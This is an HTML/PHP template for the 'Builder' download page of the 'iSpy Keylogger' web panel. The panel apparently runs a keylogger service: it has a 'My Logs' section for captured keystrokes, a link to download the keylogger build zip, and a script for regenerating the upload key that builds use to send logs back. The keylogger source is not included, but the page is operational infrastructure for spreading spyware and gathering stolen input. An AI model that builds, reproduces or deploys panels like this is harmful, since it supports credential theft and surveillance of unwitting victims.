<!DOCTYPE html>
<html lang="en">
<head>
    <!-- META SECTION -->
    <title>iSpy Keylogger :: Builder</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <link rel="icon" href="favicon.ico" type="image/x-icon" />
    <!-- END META SECTION -->

    <!-- CSS INCLUDE -->
    <link rel="stylesheet" type="text/css" id="theme" href="css/theme-serenity.css"/>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
    <!-- EOF CSS INCLUDE -->
</head>
<body class="page-container-boxed">
<!-- START PAGE CONTAINER -->
<div class="page-container">

<!-- START PAGE SIDEBAR -->
<div class="page-sidebar">
    <!-- START X-NAVIGATION -->
    <ul class="x-navigation">
        <li class="xn-logo1">
            <a href="index">iSpy Keylogger</a>
            <a href="#" class="x-navigation-control"></a>
        </li>
        <li class="xn-profile">
            <a href="#" class="profile-mini">
                <img src="img/avatar.png" alt="John Doe"/>
            </a>
            <div class="profile">
                <div class="profile-image">
                    <img src="img/avatar.png" alt="ava"/>
                </div>
                <div class="profile-data">
                    <div class="profile-data-name"><?php echo $this->security->xss_clean($username); ?></div>
                    <div class="profile-data-title"><?php if ($this->security->xss_clean($group) == 0) { echo 'Administrator'; } else if ($this->security->xss_clean($group) == 1) { echo 'Standard User'; }; ?></div>
                </div>
            </div>
        </li>
        <li class="xn-title">Navigation</li>
        <li>
            <a href="index"><span class="fa fa-home"></span> <span class="xn-text">Dashboard</span></a>
        </li>
        <li>
            <a href="logs"><span class="fa fa-keyboard-o"></span> <span class="xn-text">My Logs</span></a>
        </li>
        <li class="xn-openable active">
            <a href="#"><span class="fa fa-cloud-download"></span> <span class="xn-text">Downloads</span></a>
            <ul>
                <li class="active"><a href="builder"><span class="xn-text">Builder</span></a></li>
            </ul>
        </li>
        <li>
            <a href="account"><span class="fa fa-cogs"></span> <span class="xn-text">Account Settings</span></a>
        </li>
        <li>
            <a href="terms"><span class="fa fa-book"></span> <span class="xn-text">Terms Of Service</span></a>
        </li>
        <?php if ($this->security->xss_clean($group) == 0) { ?>
            <li>
                <a href="admin/overview"><span class="fa fa-users"></span> <span class="xn-text">Admin</span></a>
            </li>
        <?php } ?>
    </ul>
    <!-- END X-NAVIGATION -->
</div>
<!-- END PAGE SIDEBAR -->

<!-- PAGE CONTENT -->
<div class="page-content">

<!-- START X-NAVIGATION VERTICAL -->
<ul class="x-navigation x-navigation-horizontal x-navigation-panel">
    <!-- TOGGLE NAVIGATION -->
    <li class="xn-icon-button">
        <a href="#" class="x-navigation-minimize"><span class="fa fa-dedent"></span></a>
    </li>
    <!-- END TOGGLE NAVIGATION -->
    <!-- SIGN OUT -->
    <li class="xn-icon-button pull-right last">
        <a href="#" class="mb-control" data-box="#mb-signout"><span class="fa fa-sign-out"></span></a>
    </li>
    <!-- END SIGN OUT -->
</ul>
<!-- END X-NAVIGATION VERTICAL -->

<!-- START BREADCRUMB -->
<ul class="breadcrumb">
    <li><a href="#">iSpy Keylogger</a></li>
    <li class="active">Builder</li>
</ul>
<!-- END BREADCRUMB -->

<div class="page-title">
    <h2><span class="fa fa-cloud-download"></span> Download Builder</h2>
</div>

<!-- PAGE CONTENT WRAPPER -->
<div class="page-content-wrap">

    <div class="row">
        <div class="col-sm-12">
            <table class="table table-striped">
                <thead>
                <tr>
                    <th>Version</th>
                    <th>Last Updated</th>
                    <th>MD5 Hash</th>
                    <th>Actions</th>
                </tr>
                </thead>
                <tbody>
                <tr>
                    <td>2.0</td>
                    <td>03-Dec-2014 17:19:44</td>
                    <td>08B6E0B7CFA8900F2FC582E429111EF9</td>
                    <td><a href="http://ispy.pw/panel/downloads/iSpy Keylogger V2.0.zip"><i class="fa fa-download"></i></a></td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>

</div>
        <!-- END PAGE CONTAINER -->

        <!-- MESSAGE BOX-->
        <div class="message-box animated fadeIn" data-sound="alert" id="mb-signout">
            <div class="mb-container">
                <div class="mb-middle">
                    <div class="mb-title"><span class="fa fa-sign-out"></span> Log <strong>Out</strong> ?</div>
                    <div class="mb-content">
                        <p>Are you sure you want to log out?</p>
                        <p>If you would like to continue using iSpy Keylogger, please click no.</p>
                    </div>
                    <div class="mb-footer">
                        <div class="pull-right">
                            <a href="logout" class="btn btn-success btn-lg">Yes</a>
                            <button class="btn btn-default btn-lg mb-control-close">No</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- END MESSAGE BOX-->

        <!-- START PRELOADS -->
        <audio id="audio-alert" src="audio/alert.mp3" preload="auto"></audio>
        <audio id="audio-fail" src="audio/fail.mp3" preload="auto"></audio>
        <!-- END PRELOADS -->

        <!-- START SCRIPTS -->
        <!-- START PLUGINS -->
        <script type="text/javascript" src="js/plugins/jquery/jquery.min.js"></script>
        <script type="text/javascript" src="js/plugins/jquery/jquery-ui.min.js"></script>
        <script type="text/javascript" src="js/plugins/bootstrap/bootstrap.min.js"></script>
        <!-- END PLUGINS -->

        <!-- THIS PAGE PLUGINS -->
        <script type="text/javascript" src="js/plugins/mcustomscrollbar/jquery.mCustomScrollbar.min.js"></script>
        <script type='text/javascript' src='js/plugins/noty/jquery.noty.js'></script>
        <script type='text/javascript' src='js/plugins/noty/layouts/topCenter.js'></script>
        <script type='text/javascript' src='js/plugins/noty/layouts/topLeft.js'></script>
        <script type='text/javascript' src='js/plugins/noty/layouts/topRight.js'></script>
        <script type='text/javascript' src='js/plugins/noty/themes/default.js'></script>
        <script type="text/javascript">
            function notyConfirm(){
                noty({
                    text: 'Are you sure you would like to generate a new Upload Key? Older builds will become useless.',
                    layout: 'topRight',
                    buttons: [
                        {addClass: 'btn btn-success btn-clean', text: 'Yes', onClick: function($noty) {
                            $noty.close();
                            window.location = 'update/key';
                        }
                        },
                        {addClass: 'btn btn-danger btn-clean', text: 'No', onClick: function($noty) {
                            $noty.close();
                        }
                        }
                    ]
                })
            }
            if(document.URL.indexOf("#updated_key") >= 0){
                noty({text: 'You have successfully generated a new upload key.', layout: 'topRight', type: 'success'});
            }
        </script>
        <!-- END PAGE PLUGINS -->

        <!-- START TEMPLATE -->
        <script type="text/javascript" src="js/plugins.js"></script>
        <script type="text/javascript" src="js/actions.js"></script>
        <!-- END TEMPLATE -->
        <!-- END SCRIPTS -->
</body>
</html>